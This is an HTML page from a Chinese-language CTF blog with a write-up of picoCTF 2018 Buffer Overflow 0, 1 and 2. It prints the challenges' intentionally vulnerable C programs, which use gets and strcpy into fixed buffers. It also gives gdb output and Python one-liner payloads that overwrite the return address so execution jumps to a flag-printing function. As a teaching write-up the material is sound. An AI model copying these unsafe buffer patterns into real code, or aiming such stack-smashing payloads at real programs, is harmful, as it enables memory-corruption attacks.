@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+    <meta charset="utf-8"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Buffer Overflow 0 / 1 / 2 | dontpan1c 的 CTF 笔记</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Buffer Overflow 0 / 1 / 2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="因为这几道题都比较简单，所以合并在一起了：" />
+<meta property="og:description" content="因为这几道题都比较简单，所以合并在一起了：" />
+<link rel="canonical" href="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html" />
+<meta property="og:url" content="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html" />
+<meta property="og:site_name" content="dontpan1c 的 CTF 笔记" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-02-26T00:00:00+00:00" />
+<script type="application/ld+json">
+{"description":"因为这几道题都比较简单，所以合并在一起了：","@type":"BlogPosting","url":"https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html","headline":"Buffer Overflow 0 / 1 / 2","dateModified":"2019-02-26T00:00:00+00:00","datePublished":"2019-02-26T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-012.html"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/fontawesome.min.css">
+    <script src="/assets/js/index.js"></script>
+</head>
+
+<body>
+    <div class="d-flex flex-grow-1 flex-column h-100">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+            <a class="navbar-brand" href="/">dontpan1c 的 CTF 笔记</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor03"
+                aria-controls="navbarColor03" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarColor03">
+                <ul class="navbar-nav mr-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/">首页</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://dontpanic.blog" target="_blank">博客</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://dontpanic.blog/about" target="_blank">关于</a>
+                    </li>
+                </ul>
+                <ul class="navbar-nav dp-navbar-right">
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://github.com/dontpanic92/ctf-writeups" target="_blank">
+                            <i class="fab fa-github"></i><span>&nbsp;仓库</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/feed.xml" target="_blank">
+                            <i class="fas fa-rss"></i><span>&nbsp;订阅</span>
+                        </a>
+                    </li>
+                </ul>
+                <form class="form-inline my-2 my-lg-0" action="/search" method="GET">
+                    <input name="query" class="form-control mr-sm-2" type="text" placeholder="搜索">
+                    <button class="btn btn-secondary my-2 my-sm-0" type="submit">搜索</button>
+                </form>
+            </div>
+        </nav>
+        <div class="d-flex flex-grow-1 h-100 container pt-3 justify-content-center">
+            <div class="col-3">
+    <div class="list-group border-primary">
+        <a class="list-group-item list-group-item-action active" href="/">
+            <h6><strong>孤舟蓑笠翁</strong></h6>
+            <span class="font-weight-light">独钓寒江雪。CTF 解题报告</span>
+        </a>
+        <a class="list-group-item list-group-item-action " href="/notes">
+            <h6><strong>温故而知新</strong></h6>
+            <span class="font-weight-light">可以为师矣。知识笔记</span>
+        </a>
+        <a class="list-group-item list-group-item-action " href="/cheatsheets">
+            <h6><strong>愿君多采撷</strong></h6>
+            <span class="font-weight-light">此物最相思。Cheatsheets</span>
+        </a>
+        <a class="list-group-item list-group-item-action " href="/tools">
+            <h6><strong>工欲善其事</strong></h6>
+            <span class="font-weight-light">必先利其器。实用工具索引</span>
+        </a>
+        <!--a class="list-group-item list-group-item-action">
+            海内存知己
+        </a-->
+    </div>
+    <div class="card mt-5">
+        <div class="card-header">
+            近期发布
+        </div>
+        <div class="list-group list-group-flush">
+            
+            <a class="list-group-item list-group-item-action" href="/writeups/reversing-kr-easy-keygenme.html">
+                <h6><strong>Easy KeygenMe</strong></h6>
+                <span class="font-weight-light"><p>题目要求 Find the Name when the Serial is 5B134977135E7D13：</p>
+</span>
+                <small>2019年03月12日 | writeups | reversing</small>
+            </a>
+            
+            <a class="list-group-item list-group-item-action" href="/notes/stack-buffer-overflow-canary.html">
+                <h6><strong>栈缓冲区溢出之三 Security Cookie / Canary</strong></h6>
+                <span class="font-weight-light"><p>当栈溢出发生时，如果能够检测到栈溢出已经发生，就可以及时中止程序的执行，从而能够避免继续走攻击者安排好的路。Windows 上的 Security Cookie 就是这样一种机制。在 Linux 上，Canary 这个名字更常用。不论是 Security Cookie 还是 Canary，它们的原理都是相同的。</p>
+</span>
+                <small>2019年02月28日 | notes | binary</small>
+            </a>
+            
+            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2018-buffer-overflow-3.html">
+                <h6><strong>Buffer Overflow 3</strong></h6>
+                <span class="font-weight-light"><p>这道题模拟了栈溢出保护，但 canary 是固定的：</p>
+</span>
+                <small>2019年02月27日 | writeups | pwn</small>
+            </a>
+            
+            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2018-buffer-overflow-012.html">
+                <h6><strong>Buffer Overflow 0 / 1 / 2</strong></h6>
+                <span class="font-weight-light"><p>因为这几道题都比较简单，所以合并在一起了：</p>
+</span>
+                <small>2019年02月26日 | writeups | pwn</small>
+            </a>
+            
+            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2013-rop-4.html">
+                <h6><strong>ROP 4</strong></h6>
+                <span class="font-weight-light"><p>这道题是 PicoCTF 2013 ROP 系列的最后一题：</p>
+</span>
+                <small>2019年02月26日 | writeups | pwn</small>
+            </a>
+            
+        </div>
+    </div>
+</div>
+<div id="content" class="col-8 pl-4">
+    <h1>Buffer Overflow 0 / 1 / 2</h1>
+<span class="d-block"><small>发布日期：2019年02月26日</small></span>
+<span class="d-block"><small>类别：pwn</small></span>
+
+<span class="d-block">
+    <small>题目来源：picoctf-2018</small>
+</span>
+
+
+<span class="d-block">
+    <small>题目链接：<a href="https://2018game.picoctf.com/" target="_blank">https://2018game.picoctf.com/</a>
+
+        (需要注册登录)
+
+    </small>
+</span>
+
+
+<hr />
+<p>因为这几道题都比较简单，所以合并在一起了：</p>
+<h4 id="第-0-题">第 0 题</h4>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb1-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb1-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb1-4" title="4"><span class="pp">#include </span><span class="im">&lt;signal.h&gt;</span></a>
+<a class="sourceLine" id="cb1-5" title="5"></a>
+<a class="sourceLine" id="cb1-6" title="6"><span class="pp">#define FLAGSIZE_MAX 64</span></a>
+<a class="sourceLine" id="cb1-7" title="7"></a>
+<a class="sourceLine" id="cb1-8" title="8"><span class="dt">char</span> flag[FLAGSIZE_MAX];</a>
+<a class="sourceLine" id="cb1-9" title="9"></a>
+<a class="sourceLine" id="cb1-10" title="10"><span class="dt">void</span> sigsegv_handler(<span class="dt">int</span> sig) {</a>
+<a class="sourceLine" id="cb1-11" title="11">  fprintf(stderr, <span class="st">&quot;%s</span><span class="sc">\n</span><span class="st">&quot;</span>, flag);</a>
+<a class="sourceLine" id="cb1-12" title="12">  fflush(stderr);</a>
+<a class="sourceLine" id="cb1-13" title="13">  exit(<span class="dv">1</span>);</a>
+<a class="sourceLine" id="cb1-14" title="14">}</a>
+<a class="sourceLine" id="cb1-15" title="15"></a>
+<a class="sourceLine" id="cb1-16" title="16"><span class="dt">void</span> vuln(<span class="dt">char</span> *input){</a>
+<a class="sourceLine" id="cb1-17" title="17">  <span class="dt">char</span> buf[<span class="dv">16</span>];</a>
+<a class="sourceLine" id="cb1-18" title="18">  strcpy(buf, input);</a>
+<a class="sourceLine" id="cb1-19" title="19">}</a>
+<a class="sourceLine" id="cb1-20" title="20"></a>
+<a class="sourceLine" id="cb1-21" title="21"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv){</a>
+<a class="sourceLine" id="cb1-22" title="22">  </a>
+<a class="sourceLine" id="cb1-23" title="23">  <span class="dt">FILE</span> *f = fopen(<span class="st">&quot;flag.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</a>
+<a class="sourceLine" id="cb1-24" title="24">  <span class="cf">if</span> (f == NULL) {</a>
+<a class="sourceLine" id="cb1-25" title="25">    printf(<span class="st">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb1-26" title="26">    exit(<span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb1-27" title="27">  }</a>
+<a class="sourceLine" id="cb1-28" title="28">  fgets(flag,FLAGSIZE_MAX,f);</a>
+<a class="sourceLine" id="cb1-29" title="29">  signal(SIGSEGV, sigsegv_handler);</a>
+<a class="sourceLine" id="cb1-30" title="30">  </a>
+<a class="sourceLine" id="cb1-31" title="31">  gid_t gid = getegid();</a>
+<a class="sourceLine" id="cb1-32" title="32">  setresgid(gid, gid, gid);</a>
+<a class="sourceLine" id="cb1-33" title="33">  </a>
+<a class="sourceLine" id="cb1-34" title="34">  <span class="cf">if</span> (argc &gt; <span class="dv">1</span>) {</a>
+<a class="sourceLine" id="cb1-35" title="35">    vuln(argv[<span class="dv">1</span>]);</a>
+<a class="sourceLine" id="cb1-36" title="36">    printf(<span class="st">&quot;Thanks! Received: %s&quot;</span>, argv[<span class="dv">1</span>]);</a>
+<a class="sourceLine" id="cb1-37" title="37">  }</a>
+<a class="sourceLine" id="cb1-38" title="38">  <span class="cf">else</span></a>
+<a class="sourceLine" id="cb1-39" title="39">    printf(<span class="st">&quot;This program takes 1 argument.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb1-40" title="40">  <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb1-41" title="41">}</a></code></pre></div>
+<div>
+<div id="writeup_show_button" style="cursor: pointer">
+    <div class="alert alert-warning">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处显示 Writeup</b>
+    </div>
+</div>
+<div id="writeup_hide_button" style="cursor: pointer" class="d-none">
+    <div class="alert alert-info">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处隐藏 Writeup</b>
+    </div>
+</div>
+<script>
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector("#writeup_show_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.remove("d-none");
+        parent.querySelector("#writeup_show_button").classList.add("d-none");
+        parent.querySelector("#writeup").classList.remove("d-none");
+    }
+    parent.querySelector("#writeup_hide_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.add("d-none");
+        parent.querySelector("#writeup_show_button").classList.remove("d-none");
+        parent.querySelector("#writeup").classList.add("d-none");
+    }
+})();
+</script>
+<div id="writeup" class="d-none" markdown="1">
+<p>只要命令行参数足够长就可以把程序搞崩溃：</p>
+<pre><code>./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
+</div>
+</div>
+<h4 id="第-1-题">第 1 题</h4>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb3-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb3-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb3-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
+<a class="sourceLine" id="cb3-5" title="5"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
+<a class="sourceLine" id="cb3-6" title="6"><span class="pp">#include </span><span class="im">&quot;asm.h&quot;</span></a>
+<a class="sourceLine" id="cb3-7" title="7"></a>
+<a class="sourceLine" id="cb3-8" title="8"><span class="pp">#define BUFSIZE 32</span></a>
+<a class="sourceLine" id="cb3-9" title="9"><span class="pp">#define FLAGSIZE 64</span></a>
+<a class="sourceLine" id="cb3-10" title="10"></a>
+<a class="sourceLine" id="cb3-11" title="11"><span class="dt">void</span> win() {</a>
+<a class="sourceLine" id="cb3-12" title="12">  <span class="dt">char</span> buf[FLAGSIZE];</a>
+<a class="sourceLine" id="cb3-13" title="13">  <span class="dt">FILE</span> *f = fopen(<span class="st">&quot;flag.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</a>
+<a class="sourceLine" id="cb3-14" title="14">  <span class="cf">if</span> (f == NULL) {</a>
+<a class="sourceLine" id="cb3-15" title="15">    printf(<span class="st">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb3-16" title="16">    exit(<span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb3-17" title="17">  }</a>
+<a class="sourceLine" id="cb3-18" title="18"></a>
+<a class="sourceLine" id="cb3-19" title="19">  fgets(buf,FLAGSIZE,f);</a>
+<a class="sourceLine" id="cb3-20" title="20">  printf(buf);</a>
+<a class="sourceLine" id="cb3-21" title="21">}</a>
+<a class="sourceLine" id="cb3-22" title="22"></a>
+<a class="sourceLine" id="cb3-23" title="23"><span class="dt">void</span> vuln(){</a>
+<a class="sourceLine" id="cb3-24" title="24">  <span class="dt">char</span> buf[BUFSIZE];</a>
+<a class="sourceLine" id="cb3-25" title="25">  gets(buf);</a>
+<a class="sourceLine" id="cb3-26" title="26"></a>
+<a class="sourceLine" id="cb3-27" title="27">  printf(<span class="st">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x</span><span class="sc">\n</span><span class="st">&quot;</span>, get_return_address());</a>
+<a class="sourceLine" id="cb3-28" title="28">}</a>
+<a class="sourceLine" id="cb3-29" title="29"></a>
+<a class="sourceLine" id="cb3-30" title="30"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv){</a>
+<a class="sourceLine" id="cb3-31" title="31"></a>
+<a class="sourceLine" id="cb3-32" title="32">  setvbuf(stdout, NULL, _IONBF, <span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb3-33" title="33">  </a>
+<a class="sourceLine" id="cb3-34" title="34">  gid_t gid = getegid();</a>
+<a class="sourceLine" id="cb3-35" title="35">  setresgid(gid, gid, gid);</a>
+<a class="sourceLine" id="cb3-36" title="36"></a>
+<a class="sourceLine" id="cb3-37" title="37">  puts(<span class="st">&quot;Please enter your string: &quot;</span>);</a>
+<a class="sourceLine" id="cb3-38" title="38">  vuln();</a>
+<a class="sourceLine" id="cb3-39" title="39">  <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb3-40" title="40">}</a></code></pre></div>
+<div>
+<div id="writeup_show_button" style="cursor: pointer">
+    <div class="alert alert-warning">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处显示 Writeup</b>
+    </div>
+</div>
+<div id="writeup_hide_button" style="cursor: pointer" class="d-none">
+    <div class="alert alert-info">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处隐藏 Writeup</b>
+    </div>
+</div>
+<script>
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector("#writeup_show_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.remove("d-none");
+        parent.querySelector("#writeup_show_button").classList.add("d-none");
+        parent.querySelector("#writeup").classList.remove("d-none");
+    }
+    parent.querySelector("#writeup_hide_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.add("d-none");
+        parent.querySelector("#writeup_show_button").classList.remove("d-none");
+        parent.querySelector("#writeup").classList.add("d-none");
+    }
+})();
+</script>
+<div id="writeup" class="d-none" markdown="1">
+<p>只需要覆盖掉返回地址即可。看一下 <code>win</code> 的地址，以及缓冲区大小：</p>
+<pre><code>(gdb) print win
+$1 = {&lt;text variable, no debug info&gt;} 0x80485cb &lt;win&gt;
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x0804862f &lt;+0&gt;:     push   %ebp
+   0x08048630 &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048632 &lt;+3&gt;:     sub    $0x28,%esp
+   0x08048635 &lt;+6&gt;:     sub    $0xc,%esp
+   0x08048638 &lt;+9&gt;:     lea    -0x28(%ebp),%eax
+   0x0804863b &lt;+12&gt;:    push   %eax
+   0x0804863c &lt;+13&gt;:    call   0x8048430 &lt;gets@plt&gt;</code></pre>
+<p>缓冲区大小为 <code>0x28</code>。因此</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb5-1" title="1">python <span class="op">-</span>c <span class="st">&quot;print &#39;0&#39;*0x28 + &#39;0000</span><span class="ch">\xcb\x85\x04\x08\n</span><span class="st">&#39;&quot;</span> <span class="op">|</span> .<span class="op">/</span>vuln</a></code></pre></div>
+</div>
+</div>
+<h3 id="第-2-题">第 2 题</h3>
+<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb6-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb6-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
+<a class="sourceLine" id="cb6-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
+<a class="sourceLine" id="cb6-5" title="5"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
+<a class="sourceLine" id="cb6-6" title="6"></a>
+<a class="sourceLine" id="cb6-7" title="7"><span class="pp">#define BUFSIZE 100</span></a>
+<a class="sourceLine" id="cb6-8" title="8"><span class="pp">#define FLAGSIZE 64</span></a>
+<a class="sourceLine" id="cb6-9" title="9"></a>
+<a class="sourceLine" id="cb6-10" title="10"><span class="dt">void</span> win(<span class="dt">unsigned</span> <span class="dt">int</span> arg1, <span class="dt">unsigned</span> <span class="dt">int</span> arg2) {</a>
+<a class="sourceLine" id="cb6-11" title="11">  <span class="dt">char</span> buf[FLAGSIZE];</a>
+<a class="sourceLine" id="cb6-12" title="12">  <span class="dt">FILE</span> *f = fopen(<span class="st">&quot;flag.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</a>
+<a class="sourceLine" id="cb6-13" title="13">  <span class="cf">if</span> (f == NULL) {</a>
+<a class="sourceLine" id="cb6-14" title="14">    printf(<span class="st">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb6-15" title="15">    exit(<span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb6-16" title="16">  }</a>
+<a class="sourceLine" id="cb6-17" title="17"></a>
+<a class="sourceLine" id="cb6-18" title="18">  fgets(buf,FLAGSIZE,f);</a>
+<a class="sourceLine" id="cb6-19" title="19">  <span class="cf">if</span> (arg1 != <span class="bn">0xDEADBEEF</span>)</a>
+<a class="sourceLine" id="cb6-20" title="20">    <span class="cf">return</span>;</a>
+<a class="sourceLine" id="cb6-21" title="21">  <span class="cf">if</span> (arg2 != <span class="bn">0xDEADC0DE</span>)</a>
+<a class="sourceLine" id="cb6-22" title="22">    <span class="cf">return</span>;</a>
+<a class="sourceLine" id="cb6-23" title="23">  printf(buf);</a>
+<a class="sourceLine" id="cb6-24" title="24">}</a>
+<a class="sourceLine" id="cb6-25" title="25"></a>
+<a class="sourceLine" id="cb6-26" title="26"><span class="dt">void</span> vuln(){</a>
+<a class="sourceLine" id="cb6-27" title="27">  <span class="dt">char</span> buf[BUFSIZE];</a>
+<a class="sourceLine" id="cb6-28" title="28">  gets(buf);</a>
+<a class="sourceLine" id="cb6-29" title="29">  puts(buf);</a>
+<a class="sourceLine" id="cb6-30" title="30">}</a>
+<a class="sourceLine" id="cb6-31" title="31"></a>
+<a class="sourceLine" id="cb6-32" title="32"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv){</a>
+<a class="sourceLine" id="cb6-33" title="33"></a>
+<a class="sourceLine" id="cb6-34" title="34">  setvbuf(stdout, NULL, _IONBF, <span class="dv">0</span>);</a>
+<a class="sourceLine" id="cb6-35" title="35">  </a>
+<a class="sourceLine" id="cb6-36" title="36">  gid_t gid = getegid();</a>
+<a class="sourceLine" id="cb6-37" title="37">  setresgid(gid, gid, gid);</a>
+<a class="sourceLine" id="cb6-38" title="38"></a>
+<a class="sourceLine" id="cb6-39" title="39">  puts(<span class="st">&quot;Please enter your string: &quot;</span>);</a>
+<a class="sourceLine" id="cb6-40" title="40">  vuln();</a>
+<a class="sourceLine" id="cb6-41" title="41">  <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb6-42" title="42">}</a></code></pre></div>
+<div>
+<div id="writeup_show_button" style="cursor: pointer">
+    <div class="alert alert-warning">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处显示 Writeup</b>
+    </div>
+</div>
+<div id="writeup_hide_button" style="cursor: pointer" class="d-none">
+    <div class="alert alert-info">
+        <b><i class="fas fa-exclamation-circle"></i> 点击此处隐藏 Writeup</b>
+    </div>
+</div>
+<script>
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector("#writeup_show_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.remove("d-none");
+        parent.querySelector("#writeup_show_button").classList.add("d-none");
+        parent.querySelector("#writeup").classList.remove("d-none");
+    }
+    parent.querySelector("#writeup_hide_button").onclick = function ()
+    {
+        parent.querySelector("#writeup_hide_button").classList.add("d-none");
+        parent.querySelector("#writeup_show_button").classList.remove("d-none");
+        parent.querySelector("#writeup").classList.add("d-none");
+    }
+})();
+</script>
+<div id="writeup" class="d-none" markdown="1">
+<p>这次需要带两个参数调用 <code>win</code>。查看一下 <code>win</code> 的地址和缓冲区大小：</p>
+<pre><code>(gdb) print win
+$1 = {&lt;text variable, no debug info&gt;} 0x80485cb &lt;win&gt;
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x08048646 &lt;+0&gt;:     push   %ebp
+   0x08048647 &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048649 &lt;+3&gt;:     sub    $0x78,%esp
+   0x0804864c &lt;+6&gt;:     sub    $0xc,%esp
+   0x0804864f &lt;+9&gt;:     lea    -0x6c(%ebp),%eax
+   0x08048652 &lt;+12&gt;:    push   %eax
+   0x08048653 &lt;+13&gt;:    call   0x8048430 &lt;gets@plt&gt;</code></pre>
+<p>缓冲区大小为 <code>0x6c</code>。因此：</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb8-1" title="1">                                                     ↓第一个参数      ↓第二个参数</a>
+<a class="sourceLine" id="cb8-2" title="2">python <span class="op">-</span>c <span class="st">&quot;print &#39;0&#39;*0x6c + &#39;0000</span><span class="ch">\xcb\x85\x04\x08</span><span class="st">RETN</span><span class="ch">\xef\xbe\xad\xde\xde\xc0\xad\xde\n</span><span class="st">&#39;&quot;</span> <span class="op">|</span> .<span class="op">/</span>vuln</a>
+<a class="sourceLine" id="cb8-3" title="3">                            ↑EBP ↑返回跳至win     ↑win的返回地址</a></code></pre></div>
+</div>
+</div>
+
+
+</div>
+
+        </div>
+        <div class="mt-5 p-5 bg-light text-muted">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-4">
+                        <h5>dontpan1c 的 CTF 笔记</h5>
+                        <span class="d-block font-weight-light">南阳一出即相，淮阴一出即将。</span>
+                        <div class="btn-toolbar mt-4">
+                            <div class="btn-group">
+                              <a class="btn btn-secondary" href="https://github.com/dontpanic92"
+                              target="_blank"><i class="fab fa-fw fa-github"></i></a>
+                              <a class="btn btn-secondary" href="https://zhihu.com/people/li-sheng-qiu"
+                              target="_blank"><i class="fab fa-fw fa-zhihu"></i></a>
+                              <a class="btn btn-secondary" href="https://weibo.com/1184181045/profile"
+                              target="_blank"><i class="fab fa-fw fa-weibo"></i></a>
+                              <a class="btn btn-secondary" href="https://linkedin.com/in/lishengqiu"
+                              target="_blank"><i class="fab fa-fw fa-linkedin-in"></i></a>
+                              <a class="btn btn-secondary" href="https://stackoverflow.com/users/3196456"
+                              target="_blank"><i class="fab fa-fw fa-stack-overflow"></i></a>
+                              <a class="btn btn-secondary" href="http://renren.com/419200039"
+                              target="_blank"><i class="fab fa-fw fa-renren"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <p><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license"><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"
+                                    alt="知识共享许可协议"></a></p>
+                        <p><small>本站所有作品均采用<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license">知识共享署名-非商业性使用-相同方式共享
+                                    4.0 国际许可协议</a>进行许可。</small></p>
+                        <p><small>本站不包含明令禁止公开解题过程的题目。</small></p>
+                        <span><small>本站由 <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> 强力驱动。</small></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
